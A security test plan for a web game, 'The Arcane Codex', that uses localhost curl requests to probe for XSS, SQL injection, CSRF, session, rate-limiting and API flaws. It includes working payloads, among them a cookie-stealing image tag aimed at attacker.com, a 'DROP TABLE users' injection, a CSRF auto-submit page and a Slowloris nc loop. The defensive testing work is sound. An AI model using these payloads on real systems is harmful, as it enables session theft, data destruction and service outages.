# The Arcane Codex - Security Test Scenarios

## Table of Contents
1. [XSS (Cross-Site Scripting) Tests](#xss-cross-site-scripting-tests)
2. [SQL Injection Tests](#sql-injection-tests)
3. [CSRF (Cross-Site Request Forgery) Tests](#csrf-cross-site-request-forgery-tests)
4. [Session Hijacking Tests](#session-hijacking-tests)
5. [Authentication Bypass Tests](#authentication-bypass-tests)
6. [Authorization Escalation Tests](#authorization-escalation-tests)
7. [Input Fuzzing Tests](#input-fuzzing-tests)
8. [Rate Limiting Tests](#rate-limiting-tests)
9. [File Upload Security](#file-upload-security)
10. [API Security Tests](#api-security-tests)

---

## XSS (Cross-Site Scripting) Tests

### Test 1.1: Script Tag Injection in Username

**Objective:** Verify that script tags in usernames are blocked

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "<script>alert(\"XSS\")</script>"}' \
  -c cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Username contains invalid characters"
}
```

**Pass Criteria:**
- HTTP 400 Bad Request
- Username NOT saved to session
- Error message indicates invalid input

**Fail Criteria:**
- HTTP 200 OK (username accepted)
- Script tag stored in database
- Alert executes in browser

---

### Test 1.2: Event Handler Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "<img src=x onerror=alert(1)>"}' \
  -c cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Username contains invalid characters"
}
```

**Pass Criteria:** HTTP 400, username rejected

---

### Test 1.3: JavaScript Protocol Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "javascript:alert(document.cookie)"}' \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Invalid input detected"
}
```

**Pass Criteria:** Input sanitized or rejected

---

### Test 1.4: HTML Entity Encoding Bypass

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "&#60;script&#62;alert(1)&#60;/script&#62;"}' \
  -c cookies.txt
```

**Expected Response:** Username rejected or entities escaped

**Pass Criteria:** No script execution when rendered in HTML

---

### Test 1.5: SVG-Based XSS

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "<svg/onload=alert(1)>"}' \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Invalid input detected"
}
```

**Pass Criteria:** SVG tags stripped or rejected

---

### Test 1.6: Iframe Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "<iframe src=\"http://evil.com\"></iframe>"}' \
  -b cookies.txt
```

**Expected Response:** iframe tags removed/rejected

**Pass Criteria:** No iframe rendered in UI

---

### Test 1.7: Stored XSS via Game Code

**Attack Vector:**
```bash
# Try to create game with malicious code
curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -d '{"custom_code": "<script>alert(1)</script>"}' \
  -b cookies.txt
```

**Expected Response:** Game code auto-generated (ignores custom input)

**Pass Criteria:** Game codes are alphanumeric only (validated)

---

### Test 1.8: DOM-Based XSS via URL Parameters

**Manual Test:** Open in browser
```
http://localhost:5000/?name=<script>alert(1)</script>
```

**Pass Criteria:**
- No alert box appears
- URL parameters sanitized before rendering
- Content Security Policy (CSP) blocks inline scripts

---

### Test 1.9: Reflected XSS in Error Messages

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": "<script>alert(1)</script>"}' \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Game not found"
}
```

**Pass Criteria:**
- Error message does NOT echo back the malicious input
- Script tags not present in response

---

### Test 1.10: XSS in JSON Responses

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "\"><script>alert(1)</script>"}' \
  -b cookies.txt
```

**Expected Response:** JSON properly escaped

**Pass Criteria:** Response is valid JSON with escaped characters

---

## SQL Injection Tests

### Test 2.1: Classic SQL Injection in Username

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\" OR \"1\"=\"1"}' \
  -c cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Username contains invalid characters"
}
```

**Pass Criteria:**
- Username rejected (contains quotes)
- No database query modification
- Parameterized queries used

---

### Test 2.2: Union-Based SQL Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": "ABC123\" UNION SELECT * FROM users--"}' \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Game not found"
}
```

**Pass Criteria:**
- Game code validation fails (wrong format)
- No data from other tables exposed

---

### Test 2.3: Time-Based Blind SQL Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": "ABC123\"; SELECT SLEEP(10)--"}' \
  -b cookies.txt
```

**Expected Response:** Immediate response (no delay)

**Pass Criteria:**
- Response time <500ms
- No sleep/delay commands executed

---

### Test 2.4: Boolean-Based Blind SQL Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": "ABC123\" AND 1=1--"}' \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Game not found"
}
```

**Pass Criteria:** Consistent response regardless of injected condition

---

### Test 2.5: Comment-Based Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\"--"}' \
  -c cookies.txt
```

**Expected Response:** Username rejected (contains special characters)

**Pass Criteria:** No SQL comments allowed in input

---

### Test 2.6: Second-Order SQL Injection

**Attack Vector:**
```bash
# Step 1: Create user with stored payload
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "test\"; DROP TABLE users;--"}' \
  -c cookies.txt

# Step 2: Trigger payload in another query
curl -X GET http://localhost:5000/api/game_state -b cookies.txt
```

**Pass Criteria:**
- Malicious username rejected at input
- OR: Username sanitized before storage
- No table drops occur

---

### Test 2.7: NoSQL Injection (if using MongoDB)

**Note:** Arcane Codex uses SQLite, but test for future-proofing

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": {"$ne": null}}' \
  -b cookies.txt
```

**Expected Response:** Invalid input format error

**Pass Criteria:** JSON schema validation rejects non-string game codes

---

## CSRF (Cross-Site Request Forgery) Tests

### Test 3.1: CSRF Token Validation

**Attack Vector:**
```bash
# Request without CSRF token
curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -b cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "The CSRF token is missing"
}
```

**Pass Criteria:** HTTP 400, request rejected without token

---

### Test 3.2: CSRF Token Reuse Attack

**Attack Vector:**
```bash
# Get token
TOKEN=$(curl -X GET http://localhost:5000/api/csrf-token \
  -c cookies.txt | jq -r '.csrf_token')

# Use token
curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: $TOKEN" \
  -b cookies.txt

# Try to reuse same token in different session
curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -H "X-CSRFToken: $TOKEN" \
  -c cookies2.txt
```

**Expected Response:** Second request fails (token tied to session)

**Pass Criteria:** CSRF token bound to session cookie

---

### Test 3.3: Cross-Origin CSRF Attack

**Attack HTML:** (Save as `csrf_attack.html`)
```html
<!DOCTYPE html>
<html>
<body>
  <form action="http://localhost:5000/api/create_game" method="POST">
    <input type="hidden" name="username" value="attacker">
    <input type="submit" value="Click here for free gold!">
  </form>
  <script>document.forms[0].submit();</script>
</body>
</html>
```

**Test:** Open file in browser while logged into Arcane Codex

**Pass Criteria:**
- Request blocked by CSRF protection
- SameSite cookie policy prevents attack
- No game created

---

### Test 3.4: CSRF Token Prediction

**Attack Vector:**
```bash
# Get multiple tokens and analyze for patterns
for i in {1..10}; do
  curl -X GET http://localhost:5000/api/csrf-token -c cookies.txt | jq -r '.csrf_token'
done
```

**Pass Criteria:**
- Tokens are cryptographically random
- No discernible pattern
- Tokens are unique

---

### Test 3.5: CSRF via GET Request Abuse

**Attack Vector:**
```bash
# Try to perform state-changing operation via GET
curl -X GET "http://localhost:5000/api/create_game?username=attacker"
```

**Expected Response:** HTTP 405 Method Not Allowed

**Pass Criteria:**
- State-changing operations only via POST/PUT/DELETE
- GET requests cannot modify data

---

## Session Hijacking Tests

### Test 4.1: Session Cookie Theft via XSS

**Attack Vector:** (Requires XSS vulnerability - should fail)
```javascript
// Malicious script (should be blocked by XSS protection)
document.write('<img src="http://attacker.com/steal?cookie=' + document.cookie + '">');
```

**Pass Criteria:**
- HttpOnly flag prevents JavaScript cookie access
- `document.cookie` does NOT include session cookie

---

### Test 4.2: Session Fixation Attack

**Attack Vector:**
```bash
# Attacker creates session
curl -X GET http://localhost:5000/ -c attacker_session.txt

# Extract session ID
SESSION_ID=$(grep session attacker_session.txt | awk '{print $7}')

# Victim logs in with attacker's session ID (simulated)
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -H "Cookie: session=$SESSION_ID" \
  -d '{"username": "victim"}'

# Attacker tries to use same session
curl -X GET http://localhost:5000/api/game_state \
  -H "Cookie: session=$SESSION_ID"
```

**Pass Criteria:**
- Session ID regenerated on login
- Attacker's session invalidated
- New session created for victim

---

### Test 4.3: Session Replay Attack

**Attack Vector:**
```bash
# Capture valid session cookie
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "user1"}' \
  -c session1.txt

# Extract cookie
COOKIE=$(grep session session1.txt | awk '{print $7}')

# Simulate user logout (session should expire)
curl -X POST http://localhost:5000/api/logout -b session1.txt

# Try to reuse old cookie
curl -X GET http://localhost:5000/api/game_state \
  -H "Cookie: session=$COOKIE"
```

**Pass Criteria:**
- Old session rejected after logout
- HTTP 401 Unauthorized

---

### Test 4.4: Man-in-the-Middle (MITM) Attack

**Attack Simulation:**
```bash
# Intercept traffic (requires HTTPS in production)
# For testing, verify HTTP cookies have Secure flag in production

# Check cookie flags
curl -v http://localhost:5000/ 2>&1 | grep -i "set-cookie"
```

**Pass Criteria (Production):**
- Session cookies have `Secure` flag (HTTPS only)
- Session cookies have `SameSite=Lax` or `Strict`
- Session cookies have `HttpOnly` flag

**Expected (Development):**
```
Set-Cookie: session=...; HttpOnly; SameSite=Lax
```

---

### Test 4.5: Session Timeout Bypass

**Attack Vector:**
```bash
# Create session
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "testuser"}' \
  -c session.txt

# Wait 5 hours (session timeout = 4 hours)
sleep 18000  # 5 hours = 18000 seconds

# Try to access protected resource
curl -X GET http://localhost:5000/api/game_state -b session.txt
```

**Expected Response:** HTTP 401 Unauthorized (session expired)

**Pass Criteria:**
- Sessions expire after 4 hours of inactivity
- Expired sessions rejected

---

## Authentication Bypass Tests

### Test 5.1: Unauthenticated API Access

**Attack Vector:**
```bash
# Try to access protected endpoint without session
curl -X GET http://localhost:5000/api/game_state
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Authentication required"
}
```

**Pass Criteria:** HTTP 401 Unauthorized

---

### Test 5.2: Direct Object Reference

**Attack Vector:**
```bash
# User A creates game
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "userA"}' \
  -c sessionA.txt

curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -b sessionA.txt

# Get game code (assume ABC123)

# User B tries to access User A's game state directly
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "userB"}' \
  -c sessionB.txt

curl -X GET http://localhost:5000/api/game_state \
  -b sessionB.txt
```

**Expected Response:** Error (User B not in game ABC123)

**Pass Criteria:** Cannot access other players' game states

---

### Test 5.3: Parameter Tampering

**Attack Vector:**
```bash
# Try to change player_id in request
curl -X GET http://localhost:5000/api/game_state \
  -H "X-Player-ID: admin" \
  -b cookies.txt
```

**Pass Criteria:**
- player_id from session only (not client input)
- Server ignores client-provided player_id

---

### Test 5.4: JWT Token Manipulation (if used)

**Note:** Arcane Codex uses session cookies, not JWT

**Pass Criteria:** Session-based auth is more secure than client-side JWT

---

### Test 5.5: Authentication Logic Flaws

**Attack Vector:**
```bash
# Try empty username
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": ""}' \
  -c cookies.txt

# Then try to create game
curl -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -b cookies.txt
```

**Expected Response:** HTTP 400 (username required)

**Pass Criteria:** Cannot bypass auth with empty credentials

---

## Authorization Escalation Tests

### Test 6.1: Horizontal Privilege Escalation

**Attack Vector:**
```bash
# Player A joins game
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "playerA"}' \
  -c sessionA.txt

curl -X POST http://localhost:5000/api/join_game \
  -H "Content-Type: application/json" \
  -d '{"game_code": "ABC123"}' \
  -b sessionA.txt

# Player B tries to make choices for Player A's character
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "playerB"}' \
  -c sessionB.txt

curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "Attack the king", "player_id": "<playerA_id>"}' \
  -b sessionB.txt
```

**Expected Response:** Error (can only act for own character)

**Pass Criteria:** player_id from session, not client input

---

### Test 6.2: Vertical Privilege Escalation

**Attack Vector:**
```bash
# Regular player tries admin operation
curl -X POST http://localhost:5000/api/admin/reset_all_games \
  -H "Content-Type: application/json" \
  -b cookies.txt
```

**Expected Response:** HTTP 404 Not Found (endpoint doesn't exist for regular users)

**Pass Criteria:**
- No admin endpoints exposed
- Or admin endpoints require admin role check

---

### Test 6.3: Mass Assignment Vulnerability

**Attack Vector:**
```bash
# Try to set additional fields not meant to be client-controlled
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "user1", "is_admin": true, "gold": 999999}' \
  -c cookies.txt
```

**Pass Criteria:**
- Only whitelisted fields accepted
- Extra fields ignored
- No privilege escalation

---

### Test 6.4: Game State Manipulation

**Attack Vector:**
```bash
# Try to manually set party_trust to max
curl -X POST http://localhost:5000/api/game_state \
  -H "Content-Type: application/json" \
  -d '{"party_trust": 100, "gold": 999999}' \
  -b cookies.txt
```

**Expected Response:** HTTP 405 Method Not Allowed (game_state is GET only)

**Pass Criteria:**
- Game state not directly modifiable by client
- Changes only through game mechanics

---

## Input Fuzzing Tests

### Test 7.1: Extremely Long Input

**Attack Vector:**
```bash
# 10,000 character username
LONG_STRING=$(python3 -c "print('A' * 10000)")
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$LONG_STRING\"}" \
  -c cookies.txt
```

**Expected Response:**
```json
{
  "status": "error",
  "message": "Username too long (max 20 characters)"
}
```

**Pass Criteria:**
- HTTP 400 Bad Request
- Maximum length enforced (20 chars)
- No buffer overflow

---

### Test 7.2: Null Byte Injection

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\u0000hidden"}' \
  -c cookies.txt
```

**Pass Criteria:**
- Null bytes removed or rejected
- Username validation prevents null bytes

---

### Test 7.3: Unicode Normalization Attack

**Attack Vector:**
```bash
# Try various Unicode representations of "admin"
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "аdmin"}' \
  -c cookies.txt  # Cyrillic 'а' looks like Latin 'a'
```

**Pass Criteria:**
- Unicode characters handled consistently
- Homograph attacks prevented (if relevant)

---

### Test 7.4: Special Character Injection

**Attack Vector:**
```bash
# Test various special characters
SPECIAL_CHARS='!@#$%^&*()[]{}|\\";:<>?/~`'
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d "{\"username\": \"$SPECIAL_CHARS\"}" \
  -c cookies.txt
```

**Expected Response:** Username rejected (invalid characters)

**Pass Criteria:** Only alphanumeric and spaces allowed

---

### Test 7.5: Format String Attack

**Attack Vector:**
```bash
curl -X POST http://localhost:5000/api/make_choice \
  -H "Content-Type: application/json" \
  -d '{"choice": "%s%s%s%s%s%s%s%s%s%s"}' \
  -b cookies.txt
```

**Pass Criteria:**
- No format string interpretation
- Input treated as literal string

---

### Test 7.6: Negative Numbers / Type Confusion

**Attack Vector:**
```bash
# Try negative gold
curl -X POST http://localhost:5000/api/inventory/add \
  -H "Content-Type: application/json" \
  -d '{"item_id": "gold", "quantity": -1000}' \
  -b cookies.txt
```

**Expected Response:** Error (quantity must be positive)

**Pass Criteria:** Input validation prevents negative values

---

### Test 7.7: Array/Object Confusion

**Attack Vector:**
```bash
# Send array instead of string
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": ["admin", "user2"]}' \
  -c cookies.txt
```

**Expected Response:** HTTP 400 (invalid type)

**Pass Criteria:** Type validation enforced

---

## Rate Limiting Tests

### Test 8.1: Rapid Request Flooding

**Attack Vector:**
```bash
# Send 100 requests in quick succession
for i in {1..100}; do
  curl -X POST http://localhost:5000/api/create_game \
    -H "Content-Type: application/json" \
    -b cookies.txt &
done
wait
```

**Expected Response:**
- First 10 requests: HTTP 200 OK
- Remaining requests: HTTP 429 Too Many Requests

**Pass Criteria:**
- Rate limit triggered (10 per hour for create_game)
- Requests blocked with 429

---

### Test 8.2: Distributed Rate Limit Bypass

**Attack Vector:**
```bash
# Try to bypass rate limiting using multiple IPs (simulated)
for ip in 192.168.1.{1..20}; do
  curl -X POST http://localhost:5000/api/create_game \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: $ip" \
    -b cookies.txt
done
```

**Pass Criteria:**
- Rate limiting per IP address
- X-Forwarded-For validated (or ignored in dev)

---

### Test 8.3: Slowloris Attack

**Attack Vector:**
```bash
# Send slow, incomplete requests to exhaust connections
for i in {1..100}; do
  (echo -n "POST /api/create_game HTTP/1.1\r\nHost: localhost:5000\r\n"; sleep 60) | nc localhost 5000 &
done
```

**Pass Criteria:**
- Connection timeout configured
- Server remains responsive
- Connections closed after timeout

---

### Test 8.4: API Rate Limit Verification

**Test different endpoints:**
```bash
# Test /api/inventory/equip (30 per minute limit)
for i in {1..35}; do
  curl -X POST http://localhost:5000/api/inventory/equip \
    -H "Content-Type: application/json" \
    -d '{"item_id": "sword", "slot": "main_hand"}' \
    -b cookies.txt
  echo "Request $i"
done
```

**Pass Criteria:**
- First 30 requests succeed
- Requests 31-35 blocked with HTTP 429

---

## File Upload Security

### Test 9.1: Avatar Upload (if implemented)

**Note:** Arcane Codex currently doesn't have file uploads

**Attack Vector (for future):**
```bash
# Upload PHP shell disguised as image
curl -X POST http://localhost:5000/api/upload_avatar \
  -F "avatar=@shell.php.jpg" \
  -b cookies.txt
```

**Pass Criteria (if implemented):**
- File type validation (magic bytes, not extension)
- Uploaded files not executable
- Files stored outside webroot
- Filename sanitization

---

## API Security Tests

### Test 10.1: API Enumeration

**Attack Vector:**
```bash
# Try to discover hidden API endpoints
for endpoint in admin debug test internal config; do
  curl -X GET http://localhost:5000/api/$endpoint -b cookies.txt
  echo "Testing: /api/$endpoint"
done
```

**Expected Response:** HTTP 404 for non-existent endpoints

**Pass Criteria:**
- No hidden endpoints exposed
- Consistent error responses (no information leakage)

---

### Test 10.2: API Version Tampering

**Attack Vector:**
```bash
# Try different API versions
curl -X GET http://localhost:5000/api/v2/game_state -b cookies.txt
curl -X GET http://localhost:5000/api/v0/game_state -b cookies.txt
```

**Pass Criteria:**
- Only documented API version works
- Other versions return 404

---

### Test 10.3: HTTP Method Override

**Attack Vector:**
```bash
# Try to bypass method restrictions
curl -X POST http://localhost:5000/api/game_state \
  -H "X-HTTP-Method-Override: DELETE" \
  -b cookies.txt
```

**Expected Response:** HTTP 405 Method Not Allowed

**Pass Criteria:** Method override not honored for sensitive operations

---

### Test 10.4: Content-Type Confusion

**Attack Vector:**
```bash
# Send XML instead of JSON
curl -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/xml" \
  -d '<username>attacker</username>' \
  -c cookies.txt
```

**Expected Response:** HTTP 400 (invalid content type)

**Pass Criteria:** Only JSON accepted for JSON endpoints

---

### Test 10.5: Mass Endpoint Testing

**Automated fuzzing script:**
```bash
#!/bin/bash
# test_all_endpoints.sh

ENDPOINTS=(
  "/api/set_username"
  "/api/create_game"
  "/api/join_game"
  "/api/game_state"
  "/api/inventory/all"
  "/api/make_choice"
)

METHODS=("GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS")

for endpoint in "${ENDPOINTS[@]}"; do
  for method in "${METHODS[@]}"; do
    echo "Testing $method $endpoint"
    curl -X $method http://localhost:5000$endpoint \
      -b cookies.txt \
      -w "\nStatus: %{http_code}\n\n"
  done
done
```

**Pass Criteria:**
- Correct HTTP methods return 200/201
- Incorrect methods return 405
- No unexpected 500 errors

---

## Security Test Results Template

### Test Execution Log

| Test ID | Test Name | Expected Result | Actual Result | Status | Notes |
|---------|-----------|----------------|---------------|--------|-------|
| XSS-1.1 | Script Tag Injection | HTTP 400 | HTTP 400 | PASS | Username rejected |
| XSS-1.2 | Event Handler Injection | HTTP 400 | HTTP 400 | PASS | - |
| SQL-2.1 | Classic SQL Injection | HTTP 400 | HTTP 400 | PASS | Parameterized queries |
| CSRF-3.1 | CSRF Token Validation | HTTP 400 | HTTP 400 | PASS | Token required |
| ... | ... | ... | ... | ... | ... |

---

## Automated Security Testing Script

Create `run_security_tests.sh`:

```bash
#!/bin/bash

echo "=========================================="
echo "ARCANE CODEX SECURITY TEST SUITE"
echo "=========================================="
echo ""

# Ensure server is running
curl -s http://localhost:5000/ > /dev/null
if [ $? -ne 0 ]; then
  echo "ERROR: Server not running on http://localhost:5000"
  exit 1
fi

echo "[✓] Server is running"
echo ""

# XSS Tests
echo "=========================================="
echo "XSS TESTS"
echo "=========================================="

echo -n "Test XSS-1.1: Script tag injection... "
RESPONSE=$(curl -s -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "<script>alert(1)</script>"}' \
  -c /tmp/cookies.txt \
  -w "%{http_code}")
if echo "$RESPONSE" | grep -q "400"; then
  echo "PASS"
else
  echo "FAIL (Expected 400, got $RESPONSE)"
fi

echo -n "Test XSS-1.2: Event handler injection... "
RESPONSE=$(curl -s -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "<img src=x onerror=alert(1)>"}' \
  -w "%{http_code}")
if echo "$RESPONSE" | grep -q "400"; then
  echo "PASS"
else
  echo "FAIL"
fi

# SQL Injection Tests
echo ""
echo "=========================================="
echo "SQL INJECTION TESTS"
echo "=========================================="

echo -n "Test SQL-2.1: Classic SQL injection... "
RESPONSE=$(curl -s -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "admin\" OR \"1\"=\"1"}' \
  -w "%{http_code}")
if echo "$RESPONSE" | grep -q "400"; then
  echo "PASS"
else
  echo "FAIL"
fi

# CSRF Tests
echo ""
echo "=========================================="
echo "CSRF TESTS"
echo "=========================================="

echo -n "Test CSRF-3.1: CSRF token required... "
RESPONSE=$(curl -s -X POST http://localhost:5000/api/create_game \
  -H "Content-Type: application/json" \
  -w "%{http_code}")
if echo "$RESPONSE" | grep -q "400\|401"; then
  echo "PASS"
else
  echo "FAIL"
fi

# Rate Limiting Tests
echo ""
echo "=========================================="
echo "RATE LIMITING TESTS"
echo "=========================================="

echo -n "Test RATE-8.1: Rate limit enforcement... "
# Set username first
curl -s -X POST http://localhost:5000/api/set_username \
  -H "Content-Type: application/json" \
  -d '{"username": "ratetest"}' \
  -c /tmp/rate_cookies.txt > /dev/null

# Send 12 requests (limit is 10/hour)
BLOCKED=0
for i in {1..12}; do
  HTTP_CODE=$(curl -s -X POST http://localhost:5000/api/create_game \
    -H "Content-Type: application/json" \
    -b /tmp/rate_cookies.txt \
    -w "%{http_code}" \
    -o /dev/null)
  if [ "$HTTP_CODE" == "429" ]; then
    BLOCKED=1
    break
  fi
done

if [ $BLOCKED -eq 1 ]; then
  echo "PASS (Rate limit triggered)"
else
  echo "FAIL (No rate limit)"
fi

echo ""
echo "=========================================="
echo "SECURITY TEST SUMMARY"
echo "=========================================="
echo "Review results above for PASS/FAIL status"
echo ""
```

**Run the script:**
```bash
chmod +x run_security_tests.sh
./run_security_tests.sh
```

---

## Penetration Testing Checklist

- [ ] **XSS Testing**
  - [ ] Script tag injection blocked
  - [ ] Event handler injection blocked
  - [ ] JavaScript protocol blocked
  - [ ] HTML entity encoding bypass prevented
  - [ ] SVG-based XSS blocked
  - [ ] Iframe injection blocked

- [ ] **SQL Injection Testing**
  - [ ] Classic injection prevented
  - [ ] Union-based injection prevented
  - [ ] Time-based blind injection prevented
  - [ ] Boolean-based blind injection prevented
  - [ ] Parameterized queries verified

- [ ] **CSRF Testing**
  - [ ] CSRF tokens required
  - [ ] CSRF tokens unique per session
  - [ ] SameSite cookie policy enabled
  - [ ] Cross-origin requests blocked

- [ ] **Session Security**
  - [ ] HttpOnly flag set
  - [ ] Secure flag set (HTTPS)
  - [ ] Session expiration works
  - [ ] Session fixation prevented

- [ ] **Authentication**
  - [ ] Unauthenticated access blocked
  - [ ] Weak credentials rejected
  - [ ] Brute force protection active

- [ ] **Authorization**
  - [ ] Horizontal privilege escalation prevented
  - [ ] Vertical privilege escalation prevented
  - [ ] Direct object reference protected

- [ ] **Input Validation**
  - [ ] Long input rejected
  - [ ] Special characters handled
  - [ ] Type validation enforced
  - [ ] Null bytes prevented

- [ ] **Rate Limiting**
  - [ ] Rate limits enforced
  - [ ] 429 responses returned
  - [ ] Per-endpoint limits work

---

## Reporting Security Issues

If you discover a security vulnerability:

1. **DO NOT** open a public GitHub issue
2. Document the vulnerability:
   - Attack vector
   - Steps to reproduce
   - Impact assessment
   - Suggested fix
3. Report privately to the development team
4. Allow time for patching before disclosure

---

## Security Testing Best Practices

1. **Test in isolated environment** - Never test on production
2. **Get authorization** - Ensure you have permission to test
3. **Document everything** - Record all test attempts and results
4. **Use automated tools** - OWASP ZAP, Burp Suite, SQLMap
5. **Manual verification** - Don't rely solely on automated tests
6. **Retest after fixes** - Verify patches work correctly
7. **Regular testing** - Security is ongoing, not one-time

---

## Additional Security Tools

### OWASP ZAP (Automated Security Scanner)
```bash
# Install OWASP ZAP
# Run automated scan
zap-cli quick-scan http://localhost:5000
```

### SQLMap (SQL Injection Testing)
```bash
# Test for SQL injection
sqlmap -u "http://localhost:5000/api/join_game" \
  --data='{"game_code":"test"}' \
  --cookie="session=..." \
  --level=5 \
  --risk=3
```

### Burp Suite (Manual Testing)
- Configure browser proxy to Burp Suite
- Intercept and modify requests
- Test for vulnerabilities manually

---

**Security is everyone's responsibility. Test thoroughly, patch quickly, monitor constantly.**
